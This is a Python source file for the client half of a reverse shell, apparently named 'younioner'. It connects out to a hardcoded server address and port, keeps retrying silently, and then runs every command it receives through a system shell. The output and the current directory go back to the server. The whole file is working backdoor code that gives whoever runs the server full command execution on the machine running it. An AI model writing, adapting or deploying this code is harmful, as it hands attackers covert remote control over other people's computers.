from socket import *
import subprocess
import os
import time
import sys

ip = '192.168.1.88'  # server ip, which you want to connect to
port = 4343  # the port needs to be the same as server.py port in order to connect with server

class Client:
    def __init__(self, _host, _port=3434):
        self.host = _host
        self.port = _port
        self.s = None

        self.launch()

    # run younioner
    def launch(self):
        try:
            self.open_socket()
            self.receive_commands()
            self.chat()

        except error as e:
            time.sleep(6)
            self.launch()

    # will create the socket
    def open_socket(self):
        try:
            self.s = socket(AF_INET, SOCK_STREAM)
            self.s.connect((self.host, self.port))

        except:
            time.sleep(5)
            self.open_socket()

    # receive commands from the Server
    def receive_commands(self):
        try:
            while True:
                data = self.s.recv(1024)
                striped_data = data[:].strip().decode("utf-8")

                if striped_data[:2] == 'cd':
                    os.chdir(striped_data[3:])

                if len(data) > 0:
                    try:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stderr=subprocess.PIPE,
                                               stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                        result = str(cmd.stdout.read() + cmd.stderr.read(), "utf-8")

                        self.s.send(str.encode(result + str(os.getcwd()) + " > "))
                    except:
                        result = "Command not recognized \n"
                        self.s.send(str.encode(result + str(os.getcwd()) + " > "))


                # this condition will work when the user quit server.py
                if striped_data == "end-of-session":
                    time.sleep(2)
                    self.s.close()
                    sys.exit(0)
                    os._exit(0)
                    exit(0)
                    quit(0)

            self.s.close()

        except:
            time.sleep(5)
            self.receive_commands()

if __name__ == '__main__':
    c = Client(ip, port)
